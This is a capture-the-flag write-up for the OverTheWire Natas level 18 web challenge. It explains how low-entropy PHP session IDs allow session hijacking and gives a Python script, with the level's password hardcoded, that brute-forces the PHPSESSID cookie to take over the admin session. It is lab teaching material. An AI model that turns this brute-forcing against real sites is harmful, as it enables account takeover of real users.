So, let's see what happens using the `debug` parameter to a GET HTTP request. (I didn't take a picture of the ability of this parameter, it appears in almost every challenge. The goal is to see what happens inside through printing)

![](4.png)

From these prints it can be concluded that there was no `"admin"` in `$_SESSION`. But how can I insert `"admin"` into the `$_SESSION` details? After all, it is saved on the server. And unlike a `$_COOKIE`, I have no control over it... Not clear now. We will continue to the `print_creadentials()` function:

That is, the value of the key `"admin"` in `$_SESSION` needs to be 1, and we have no control over that. But there is another interesting thing here...

![](6.png)

The creation of sessions is limited! This means that one of the sessions may be the admin's. We have control over the current session number using `PHPSESSID` in the `$_COOKIE`:

The `createID()` function is responsible for the randomness and range of the session we will receive from the server.

So, we will now build a Python program that will try to log-in by brute force on the value of the `PHPSESSID` key in the cookie:

```python
from requests import get
from requests.auth import HTTPBasicAuth

# Current level details
natas18_username = "natas18"
natas18_password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"

# GET HTTP details
URL = "http://natas18.natas.labs.overthewire.org/?username=admin&password=admin"
AUTH = HTTPBasicAuth(natas18_username, natas18_password)
COOKIES = {'PHPSESSID': None}

res = None
for i in range(1, 640 + 1):
    COOKIES['PHPSESSID'] = str(i)
    res = get(url=URL, auth=AUTH, cookies=COOKIES)
    if "Password" in res.text:
        print(f"admin PHPSESSID value is: {i}")
        break
    else:
        print(f"admin PHPSESSID value is NOT: {i}")

print(res.text)
```
